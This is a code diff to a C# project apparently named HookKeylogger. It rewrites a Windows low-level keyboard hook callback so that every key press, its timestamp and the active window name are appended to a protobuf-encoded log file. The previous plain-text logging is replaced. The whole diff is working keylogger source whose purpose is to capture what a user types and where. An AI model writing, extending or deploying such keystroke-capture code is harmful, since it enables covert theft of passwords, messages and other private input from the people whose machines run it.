@@ -4,6 +4,8 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
+using HookKeylogger.Base;
+using Google.Protobuf;
 
 namespace Hooks
 {
@@ -64,20 +66,45 @@ namespace Hooks
         }
 
         ///<summary>
-        ///Connect the hook to the process.
+        /// HookCallback function
+        /// 
+        /// Called each time a Hook Event is fired. If the type of event is a KeyPress append the keypress and metadata to a keypress log.
+        /// This function calls the next hook in the hook chain.
         ///</summary>
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
+                KeyPress ks = new KeyPress();
+                DateTimeOffset x = new DateTimeOffset(DateTime.Now);
+                ks.Key = Marshal.ReadInt32(lParam);
+                ks.Timestamp = x.ToUnixTimeMilliseconds();
+                ks.ActiveProgram = GetActiveWindowName();
+                using (var output = File.Open(log, FileMode.Append))
+                {
+                    // Un-Comment these lines to write the KeyStrokes in the JSON human readable format. C# protosupports lacks the Text encoding
+                    // the json encoding is the most human readable format.
+                    //StreamWriter o = new StreamWriter(log+".json");
+                    //o.WriteLine(ks.ToString());
+                    //o.Close();
+
+                    // Weird behavior here. It is not specified in the Proto3 spec anywhere but this is what I found during testing.
+                    // Suppose you have a Top level Container protocol message that has repeated messages as a field. (KeyStrokeBuffer)
+                    // If you have two instances of that Top Level Message and you save both to the same file opened using append.
+                    // Then if you parse the same file you will end up with one of the Top Level Container messages which containes the
+                    // child messages of both orgional Container Messages.
+                    // The code below uses that fact to append one KeyStroke to the KeyStrokeBuffer container in the binary log. This
+                    // is a hack. The proper way to store multiple messages in the same file is to first write the size and parse each
+                    // individual chunck of the buffer individually. See: https://developers.google.com/protocol-buffers/docs/techniques#streaming
+                    // This is easier, and is really fast, so until it blows up I'm going to leave it like this.
+                    KeyPressBuffer b = new KeyPressBuffer();
+                    b.Keys.Add(ks);
+                    b.WriteTo(output);
+                    output.Close();
+                }
+
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
-                StreamWriter sw = new StreamWriter(log, true);
-                sw.Write((Keys)vkCode);
-                using (Process curProcess = Process.GetCurrentProcess())
-                sw.Write(" - Process Name: "+(GetActiveWindowName()));
-                sw.WriteLine();
-                sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
